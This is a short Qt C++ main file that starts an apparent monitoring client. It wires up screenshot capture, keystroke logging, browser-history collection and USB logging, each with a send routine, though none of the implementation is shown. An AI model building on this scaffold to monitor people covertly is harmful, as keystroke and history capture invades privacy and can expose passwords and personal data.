#include <QApplication>
#include <QDebug>
#include <QTimer>
#include "MonitorClient.h"

int main(int argc, char *argv[])
{
    QApplication app(argc, argv);
    
    qDebug() << "=== Ubuntu MonitorClient Starting ===";
    qDebug() << "Qt Version:" << qVersion();
    qDebug() << "System Architecture:" << QSysInfo::currentCpuArchitecture();
    
    // Create MonitorClient instance
    MonitorClient *client = new MonitorClient();
    
    // Connect client signals to slots
    QObject::connect(client, &MonitorClient::screen, client, &MonitorClient::getScreen);
    QObject::connect(client, &MonitorClient::tic, client, &MonitorClient::sendTic);
    QObject::connect(client, &MonitorClient::browserHistory, client, &MonitorClient::sendBrowserHistories);
    QObject::connect(client, &MonitorClient::keyLog, client, &MonitorClient::sendKeyLogs);
    QObject::connect(client, &MonitorClient::usbLog, client, &MonitorClient::sendUSBLogs);
    QObject::connect(client, &MonitorClient::usbEvent, client, &MonitorClient::handleUsbEvent);
    
    // Start the monitoring
    QTimer::singleShot(1000, client, &MonitorClient::run);
    
    qDebug() << "MonitorClient started successfully!";
    
    return app.exec();
} 